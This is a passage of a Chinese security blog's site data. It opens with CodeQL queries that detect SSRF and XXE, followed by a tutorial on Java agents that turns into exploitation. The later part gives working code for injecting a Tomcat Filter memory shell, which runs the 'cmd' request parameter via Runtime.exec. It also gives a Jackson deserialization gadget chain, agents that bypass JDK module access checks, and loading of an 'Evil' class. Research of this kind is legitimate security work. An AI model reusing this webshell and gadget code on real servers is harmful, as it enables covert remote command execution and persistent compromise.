class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.security.RequestForgeryConfig</span><br><span class=\"line\"></span><br><span class=\"line\">MethodAccess <span class=\"title function_\">url</span><span class=\"params\">(MethodAccess ma,DataFlow::Node node)</span>&#123;</span><br><span class=\"line\">  exists( MethodAccess mc | mc = ma.getAChildExpr()| <span class=\"keyword\">if</span> mc.getCallee().hasName(<span class=\"string\">&quot;url&quot;</span>) and mc.getArgument(<span class=\"number\">0</span>) = node.asExpr() <span class=\"type\">then</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> mc <span class=\"keyword\">else</span> result = url(mc,node)</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">MethodAccess <span class=\"title function_\">m</span><span class=\"params\">(DataFlow::Node node)</span>&#123;</span><br><span class=\"line\">  exists(</span><br><span class=\"line\">      MethodAccess ma | ma.getCallee().hasName(<span class=\"string\">&quot;build&quot;</span>) and ma.getCallee().getDeclaringType().hasName(<span class=\"string\">&quot;Builder&quot;</span>) |result = url(ma,node)</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TypeStringLib</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RefType</span> &#123;</span><br><span class=\"line\">  TypeStringLib() &#123; <span class=\"built_in\">this</span>.hasQualifiedName(<span class=\"string\">&quot;java.lang&quot;</span>, <span class=\"string\">&quot;String&quot;</span>) &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">StringValue</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">MethodAccess</span> &#123;</span><br><span class=\"line\">  StringValue()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getCallee().getDeclaringType() <span class=\"keyword\">instanceof</span> TypeStringLib and</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.getCallee().hasName(<span class=\"string\">&quot;valueOf&quot;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyRequestForgeryAdditionalTaintStep</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RequestForgeryAdditionalTaintStep</span> &#123;</span><br><span class=\"line\">  override predicate <span class=\"title function_\">propagatesTaint</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URI when its host is assigned to</span></span><br><span class=\"line\">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or</span><br><span class=\"line\">    <span class=\"comment\">// propagate to a URL when its host is assigned to</span></span><br><span class=\"line\">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">    or </span><br><span class=\"line\">    <span class=\"comment\">//处理String.valueOf(URL)</span></span><br><span class=\"line\">    exists(StringValue c | c.getArgument(<span class=\"number\">0</span>) = pred.asExpr() | succ.asExpr() = c)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SSRFVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">  SSRFVulConfig() &#123; <span class=\"built_in\">this</span> = <span class=\"string\">&quot;first_modifySSRF&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node source)</span> &#123;</span><br><span class=\"line\">      source <span class=\"keyword\">instanceof</span> RemoteFlowSource and</span><br><span class=\"line\">      <span class=\"comment\">// Exclude results of remote HTTP requests: fetching something else based on that result</span></span><br><span class=\"line\">      <span class=\"comment\">// is no worse than following a redirect returned by the remote server, and typically</span></span><br><span class=\"line\">      <span class=\"comment\">// we&#x27;re requesting a resource via https which we trust to only send us to safe URLs.</span></span><br><span class=\"line\">      not source.asExpr().(MethodAccess).getCallee() <span class=\"keyword\">instanceof</span> UrlConnectionGetInputStreamMethod</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">      sink <span class=\"keyword\">instanceof</span> RequestForgerySink or  </span><br><span class=\"line\">      <span class=\"comment\">//sink = URL对象</span></span><br><span class=\"line\">      exists (m(sink))</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   override predicate <span class=\"title function_\">isAdditionalTaintStep</span><span class=\"params\">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;</span><br><span class=\"line\">      any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h1><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class=\"line\"><span class=\"keyword\">import</span> DataFlow::PathGraph</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">XXEVulConfig</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">TaintTracking</span>::Configuration &#123;</span><br><span class=\"line\">  XXEVulConfig()&#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span> = <span class=\"string\">&quot;XXEVulConfig&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override predicate <span class=\"title function_\">isSource</span><span class=\"params\">(DataFlow::Node src)</span> &#123;</span><br><span class=\"line\">      src <span class=\"keyword\">instanceof</span> RemoteFlowSource</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  override predicate <span class=\"title function_\">isSink</span><span class=\"params\">(DataFlow::Node sink)</span> &#123;</span><br><span class=\"line\">      exists(Method method, MethodAccess call|</span><br><span class=\"line\">          method.hasName(<span class=\"string\">&quot;parse&quot;</span>) and</span><br><span class=\"line\">          call.getMethod() = method and</span><br><span class=\"line\">          sink.asExpr() = call.getArgument(<span class=\"number\">0</span>)</span><br><span class=\"line\">          )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from XXEVulConfig xxeVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class=\"line\">where xxeVulConfig.hasFlowPath(source, sink)</span><br><span class=\"line\">select source.getNode(), source, sink, <span class=\"string\">&quot;source&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n\n"},{"data":"2024-09-28T16:00:00.000Z","title":"java agent的基础讲解和一些利用","_content":"\n# Agent基本认识\n\nAgent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的`premain-Agent`，另一种是 JVM 启动之后加载的 `agentmain-Agent`。这里我们可以将其理解成一种特殊的 Interceptor（拦截器）\n\n## premain-Agent\n\n首先我们先定义这样一个 agent.jar\n\n```java\npublic class Java_Agent_premain {\n    public static void premain(String args, Instrumentation inst) {\n        for (int i=0 ; i<10 ; i++){\n            System.out.println(\"调用了premain-Agent！\");\n        }\n    }\n}\n```\n\nAgent.mf \n\n```\nManifest-Version: 1.0\nPremain-Class: Java_Agent_premain\n```\n\n然后 生成我们的 premain agent\n\n`jar cvfm agent.jar META-INF/maven/agent.MF Java_Agent_premain.class`\n\n\n\n相应的我们准备一个 hello.jar\n\n```java\npublic class Hello {\n    public static void main(String[] args) {\n        System.out.println(\"hello\");\n    }\n}\n```\n\nhello.mf\n\n```\nManifest-Version: 1.0\nMain-Class: Hello\n```\n\njar cvfm hello.jar META-INF/maven/hello.mf Hello.class\n\n\n\n然后其实可以发现我们的Java_Agent_premain 是运行Hello之前的。\n\n这个premain-Agent是在jvm启动前加载的。\n\n```\njava -javaagent:agent.jar -jar hello.jar\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\nHello World!\n```\n\n## VirtualMachine\n\n先说一下环境，引入 tool.jar\n\n```xml\n<dependency>\n  <groupId>com.sun</groupId>\n  <artifactId>tools</artifactId>\n  <version>1.8.0</version>\n  <scope>system</scope>\n  <systemPath>/Library/Java/JavaVirtualMachines/jdk8u275/lib/tools.jar</systemPath>\n</dependency>\n```\n\n\n\n`com.sun.tools.attach.VirtualMachine`类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。\n\n比如这个 获取特定虚拟机PID\n\n```java\npublic class get_PID {\n    public static void main(String[] args) {\n        List<VirtualMachineDescriptor> list = VirtualMachine.list();\n        for(VirtualMachineDescriptor vmd : list){\n            //遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID\n            if(vmd.displayName().equals(\"com.drunkbaby.get_PID\"))\n                System.out.println(vmd.id()); \n        }\n    }\n}\n```\n\n\n\n## agentmain-Agent\n\npremain-Agent是在 JVM 启动前加载的,这个agentmain是 JVM 启动之后加载的。\n\n先编写一个 `Sleep_Hello` 类，模拟正在运行的 JVM\n\n```java\npackage com.drunkbaby;  \n  \nimport static java.lang.Thread.sleep;  \n  \npublic class Sleep_Hello {  \n    public static void main(String[] args) throws InterruptedException {  \n        while (true){  \n            System.out.println(\"Hello World!\");  \n            sleep(5000);  \n        }  \n    }  \n}\n```\n\n编写我们的 agentmain\n\n```java\npublic class Java_Agent_agentmain {\n    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {\n        while (true){\n            System.out.println(\"调用了agentmain-Agent!\");\n            sleep(3000);\n        }\n    }\n}\n```\n\nmf文件\n\n```\nManifest-Version: 1.0\nAgent-Class: com.drunkbaby.Java_Agent_agentmain\n```\n\njar cvfm hello.jar META-INF/MAINFEST.MF Java_Agent_agentmain.class\n\n\n\n然后开始注入\n\n```java\npublic class Inject_Agent {\n    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {\n        //调用VirtualMachine.list()获取正在运行的JVM列表\n        List<VirtualMachineDescriptor> list = VirtualMachine.list();\n        for(VirtualMachineDescriptor vmd : list){\n            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent\n            if(vmd.displayName().equals(\"com.drunkbaby.Sleep_Hello\")){\n\n                //连接指定JVM\n                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n                //加载Agent\n                virtualMachine.loadAgent(\"/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Agentmain/src/main/resources/hello.jar\");\n                //断开JVM连接\n                virtualMachine.detach();\n            }\n        }\n    }\n}\n```\n\n先运行Sleep_Hello再运行Inject_Agent。输出如下。\n\n```\nHello World!\n调用了agentmain-Agent!\nHello World!\n调用了agentmain-Agent!\n调用了agentmain-Agent!\n```\n\n \n\n> 但是这里我们这里只是插入，而不是改变。\n\n## 动态修改字节码 \n\nInstrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。\n\nClassFileTransformer接口下面有一个addTransformer方法。重写该方法即可转换任意类文件，并返回新的被取代的类文件，\n\n\n\n下面我们来修改这个正在运行的hello\n\n```java\npublic class Sleep_Hello {\n    public static void main(String[] args) throws InterruptedException {\n        while(true) {\n            hello();\n            sleep(3000);\n        }\n    }\n    public static void hello(){\n        System.out.println(\"Hello World!\");\n    }\n}\n```\n\n\n\n一个实现了ClassFileTransformer接口的类。\n\n```java\npublic class Hello_Transform implements ClassFileTransformer {\n\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {\n        try {\n            //获取CtClass 对象的容器 ClassPool\n            ClassPool classPool = ClassPool.getDefault();\n            //添加额外的类搜索路径\n            if (classBeingRedefined != null) {\n                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);\n                classPool.insertClassPath(ccp);\n            }\n            //获取目标类\n            CtClass ctClass = classPool.get(\"AgentShell.Sleep_Hello\");\n            System.out.println(ctClass);\n            //获取目标方法\n            CtMethod ctMethod = ctClass.getDeclaredMethod(\"hello\");\n            //设置方法体\n            String body = \"{System.out.println(\\\"Hacker!\\\");}\";\n            ctMethod.setBody(body);\n            //返回目标类字节码\n            byte[] bytes = ctClass.toBytecode();\n            return bytes;\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return null;\n    }\n}\n```\n\nagent \n\n```java\npublic class agentmain_transform {\n    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {\n        Class [] classes = inst.getAllLoadedClasses();\n\n        //获取目标JVM加载的全部类\n        for(Class cls : classes){\n            if (cls.getName().equals(\"AgentShell.Sleep_Hello\")){\n\n                //添加一个transformer到Instrumentation，并重新触发目标类加载\n                inst.addTransformer(new Hello_Transform(),true);\n                inst.retransformClasses(cls);\n            }\n        }\n    }\n}\n```\n\n修改一下mf文件\n\n```\nManifest-Version: 1.0\nAgent-Class: AgentShell.agentmain_transform\nCan-Redefine-Classes: true\nCan-Retransform-Classes: true\n```\n\npom.xml  这里使用assembly生成说需要的jar包\n\n```xml\n<build>\n  <plugins>\n    <plugin>\n      <groupId>org.apache.maven.plugins</groupId>\n      <artifactId>maven-assembly-plugin</artifactId>\n      <version>2.6</version>\n      <configuration>\n        <descriptorRefs>\n          <descriptorRef>jar-with-dependencies</descriptorRef>\n        </descriptorRefs>\n        <archive>\n          <manifestFile>\n            src/main/resources/META-INF/maven/MAINFEST.MF\n          </manifestFile>\n        </archive>\n      </configuration>\n    </plugin>\n    <plugin>\n      <groupId>org.apache.maven.plugins</groupId>\n      <artifactId>maven-compiler-plugin</artifactId>\n      <configuration>\n        <source>6</source>\n        <target>6</target>\n      </configuration>\n    </plugin>\n  </plugins>\n</build>\n```\n\n\n\n先运行Sleep_Hello 再运行这个\n\n```java\npublic class Inject_Agent {\n    public static void main(String[] args) throws Exception {\n        //调用VirtualMachine.list()获取正在运行的JVM列表\n        List<VirtualMachineDescriptor> list = VirtualMachine.list();\n        for(VirtualMachineDescriptor vmd : list){\n            System.out.println(vmd.displayName());\n            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent\n            if(vmd.displayName().equals(\"AgentShell.Sleep_Hello\")){\n                //连接指定JVM\n                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n                //加载Agent\n                virtualMachine.loadAgent(\"/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Instrumentation/target/Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar\");\n                //断开JVM连接\n                virtualMachine.detach();\n            }\n        }\n    }\n}\n```\n\n\n\n```\nHello World!\nHello World!\nHello World!\nHello World!\nHello World!\nHello World!\njavassist.CtClassType@6ae33825[public class AgentShell.Sleep_Hello fields= constructors=javassist.CtConstructor@58966603[public Sleep_Hello ()V],  methods=javassist.CtMethod@44a4fe33[public static main ([Ljava/lang/String;)V], javassist.CtMethod@30063153[public static hello ()V], ]\nHacker!\nHacker!\n```\n\n\n\n# 一些利用\n\n## 利用agentmain注入Filter内存马\n\n准备好实现了ClassFileTransformer接口的Filter_Transform\n\n```java\npublic class Filter_Transform implements ClassFileTransformer {\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {\n        try {\n\n            //获取CtClass 对象的容器 ClassPool\n            ClassPool classPool = ClassPool.getDefault();\n\n            //添加额外的类搜索路径\n            if (classBeingRedefined != null) {\n                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);\n                classPool.insertClassPath(ccp);\n            }\n\n            //获取目标类\n            CtClass ctClass = classPool.get(\"org.apache.catalina.core.ApplicationFilterChain\");\n\n            //获取目标方法\n            CtMethod ctMethod = ctClass.getDeclaredMethod(\"doFilter\");\n\n            //设置方法体\n            String body = \"{\" +\n                    \"javax.servlet.http.HttpServletRequest request = $1\\n;\" +\n                    \"String cmd=request.getParameter(\\\"cmd\\\");\\n\" +\n                    \"if (cmd !=null){\\n\" +\n                    \"  Runtime.getRuntime().exec(cmd);\\n\" +\n                    \"  }\"+\n                    \"}\";\n            ctMethod.setBody(body);\n\n            //返回目标类字节码\n            byte[] bytes = ctClass.toBytecode();\n            return bytes;\n\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return null;\n    }\n}\n```\n\n准备agent\n\n```java\npublic class agentmain_transform {\n    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {\n        Class [] classes = inst.getAllLoadedClasses();\n\n        //获取目标JVM加载的全部类\n        for(Class cls : classes){\n            if (cls.getName().equals(\"org.apache.catalina.core.ApplicationFilterChain\")){\n\n                //添加一个transformer到Instrumentation，并重新触发目标类加载\n                inst.addTransformer(new Filter_Transform(),true);\n                inst.retransformClasses(cls);\n            }\n        }\n    }\n}\n```\n\nmf文件\n\n```\nManifest-Version: 1.0\nAgent-Class: com.drunkbaby.agentmain_transform\nCan-Redefine-Classes: true\nCan-Retransform-Classes: true\n```\n\n生成对应jar包,然后开始注入\n\n```java\npublic class Inject_Agent {\n    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException {\n        //调用VirtualMachine.list()获取正在运行的JVM列表\n        List<VirtualMachineDescriptor> list = VirtualMachine.list();\n        for(VirtualMachineDescriptor vmd : list){\n            System.out.println(vmd.displayName());\n            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent\n            if(vmd.displayName().contains(\"JavaAgentSpringBootApplication\")){\n\n                //连接指定JVM\n                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n                //加载Agent\n                virtualMachine.loadAgent(\"/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/AgentInjectionExample/target/AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar\");\n                //断开JVM连接\n                virtualMachine.detach();\n            }\n\n        }\n    }\n}\n```\n\n注入成功。\n\n![image-20241120183255665](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183255665.png)\n\n## Jackson删除writeReplace方法\n\n说到这个链子，我们都知道需要删除BaseJsonNode的writeReplace方法。但是我们其实可以在premain的时候就把这件事情给做了。\n\n```java\nObject template = Gadgets.createTemplatesImpl(\"open -a Calculator\");\n\nCtClass ctClass = ClassPool.getDefault().get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\nCtMethod writeReplace = ctClass.getDeclaredMethod(\"writeReplace\");\nctClass.removeMethod(writeReplace);\nctClass.toClass();\n\nPOJONode jsonNodes = new POJONode(template);\nBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\nReflections.setFieldValue(badAttributeValueExpException, \"val\", jsonNodes);\n\nSystem.out.println(Tool.base64Encode(Tool.serialize(badAttributeValueExpException)));\n```\n\ntransform\n\n```java\npublic class JacksonClassFileTransformer implements ClassFileTransformer {\n\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer){\n        String target1 = \"com.fasterxml.jackson.databind.node.BaseJsonNode\";\n        String className2 = className.replace(\"/\", \".\");\n        if (className2.equals(target1)) {\n            System.out.println(\"Find the Inject Class: \"+target1);\n            ClassPool pool = ClassPool.getDefault();\n            try {\n                CtClass c = pool.getCtClass(className2);\n                CtMethod ctMethod = c.getDeclaredMethod(\"writeReplace\");\n                c.removeMethod(ctMethod);\n                byte[] bytes = c.toBytecode();\n                c.detach();\n                return bytes;\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        return new byte[0];\n    }\n\n}\n```\n\nagent\n\n```java\npublic class JacksonAgent {\n    public static void premain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {\n\n        inst.addTransformer(new JacksonClassFileTransformer(),true);\n        Class[] allLoadedClasses = inst.getAllLoadedClasses();\n\n        for (Class loadedClass : allLoadedClasses) {\n            if(\"com.fasterxml.jackson.databind.node.BaseJsonNode\".equals(loadedClass.getName())){\n                //重新transform\n                inst.retransformClasses(loadedClass);\n            }\n        }\n    }\n}\n```\n\n.mf\n\n```\nManifest-Version: 1.0\nCan-Redefine-Classes: true\nCan-Retransform-Classes: true\nPremain-Class: cn.org.unk.JacksonAgent\n```\n\n然后我们生成对应的jar包。\n\n然后我们需要让项目运行的时候加上这样一个参数.带上我们的premain agent。\n\n`-javaagent:/Users/taoyu/Music/code/java_code/Java-useful-agent/Java17/target/Java17-premain.jar`\n\nRun->edit configurations\n\n![image-20241120183210072](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183210072.png)\n\n然后我们构造链子的好时候就可以将以下代码删除依旧不影响我们poc的构造\n\n```\nCtClass ctClass = ClassPool.getDefault().get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\nCtMethod writeReplace = ctClass.getDeclaredMethod(\"writeReplace\");\nctClass.removeMethod(writeReplace);\nctClass.toClass();\n```\n\n\n\n## 高版本jdk反射修改私有属性\n\ndk9出现了module机制：https://zhuanlan.zhihu.com/p/640217638\n\n\n\njava.xml是module的名字，不一定要和包名一样。\n\nexports表示外部可以访问当前module的哪些package。\n\nexports…to 表示指定该package只能被哪些package访问。\n\n同一个module下的类可以互相访问。\n\n\n\n我们以这个链子为例。\n\nEventListenerList ReadObject -> ToString\n\n```java\nPerson p = new Person(\"aaa\");\nEventListenerList list = new EventListenerList();\n\nUndoManager manager = new UndoManager();\nVector vector = (Vector) getFieldValue(manager, \"edits\");\nvector.add(p);\nsetFieldValue(list, \"listenerList\", new Object[]{InternalError.class, manager});\n\nbyte[] code = serialize(list);\nunserialize(code);\n```\n\nPerson\n\n```java\npublic String toString() {\n    System.out.println(\"this is tostring\");\n}\n```\n\n我们正常情况下调用私有属性的时候。下面这个 flag值为true。\n\n```java\npublic void setAccessible(boolean flag) {\n    AccessibleObject.checkPermission();\n    if (flag) checkCanSetAccessible(Reflection.getCallerClass());\n    setAccessible0(flag);\n}\n```\n\n会爆以下错误。但是我们如果设置一个premain，就可以修改这段代码。让flag恒为flase。这样我们就可以setAccessible来进行各种操作了。\n\n```\nException in thread \"main\" java.lang.reflect.InaccessibleObjectException: Unable to make field protected java.util.Vector javax.swing.undo.CompoundEdit.edits accessible: module java.desktop does not \"opens javax.swing.undo\" to unnamed module @60d14f0f\n\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)\n\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)\n\tat java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:178)\n```\n\n\n\n```java\npublic class MyClassFileTransformer implements ClassFileTransformer {\n\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer){\n\n        String target4 = \"java.lang.reflect.Field\";\n        String className2 = className.replace(\"/\", \".\");\n\n        if (className2.equals(target4)) {\n            System.out.println(\"Find the Inject Class: \"+target4);\n            ClassPool pool = ClassPool.getDefault();\n            try {\n\n                CtClass c = pool.getCtClass(className2);\n                System.out.println(\"hhhh\");\n                CtMethod ctMethod = c.getDeclaredMethod(\"setAccessible\");\n\n                ctMethod.setBody(\"{        java.lang.reflect.AccessibleObject.checkPermission();\\n\" +\n                        \"        if (false) checkCanSetAccessible(Reflection.getCallerClass());\\n\" +\n                        \"        setAccessible0($1);}\");\n                byte[] bytes = c.toBytecode();\n                c.detach();\n                return bytes;\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        return new byte[0];\n    }\n\n}\n```\n\n\n\n```java\npublic class MyAgent {\n\n    public static void premain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {\n\n        inst.addTransformer(new MyClassFileTransformer(),true);\n        Class[] allLoadedClasses = inst.getAllLoadedClasses();\n\n        for (Class loadedClass : allLoadedClasses) {\n            if(\"java.lang.reflect.Field\".equals(loadedClass.getName())){\n                //重新transform\n                inst.retransformClasses(loadedClass);\n            }\n        }\n    }\n}\n```\n\n\n\n## 高版本JDK反射类加载\n\n由于高版本的module机制，\n\n无法反射调用 TemplatesImpl 的get方法，POJONode的toString -> 到任意get 的这种方法也没有办法用。\n\n但是我们可以修改Method 的 setAccessible也修改一下我们就可以了。但是需要让服务端加载这个permain时不太现实的。\n\n但是我们可以通过agentmain进行修改，但是有那种功夫，我们还不如注入内存马。直接拿shell。\n\n\n\n把上面的那个agent 的 Filed改成Method就可以了。\n这样的这个恶意类在jdk17的环境下依旧是可以被加载的。\n\n```java\nbyte[] bytes = Files.readAllBytes(Paths.get(\"target/classes/Evil.class\"));\n\nMethod method = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\nmethod.setAccessible(true);\n((Class)method.invoke(ClassLoader.getSystemClassLoader(), \"Evil\", bytes, 0, bytes.length)).newInstance();\n\n```\n\n\n\n\n\n\n\n\n","source":"_posts/javaAgent.md","raw":"\n---\ndata: 2024-09-29\ntitle: java agent的基础讲解和一些利用\ntags:\n  - java安全\n  - myblog\n---\n\n# Agent基本认识\n\nAgent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的`premain-Agent`，另一种是 JVM 启动之后加载的 `agentmain-Agent`。这里我们可以将其理解成一种特殊的 Interceptor（拦截器）\n\n## premain-Agent\n\n首先我们先定义这样一个 agent.jar\n\n```java\npublic class Java_Agent_premain {\n    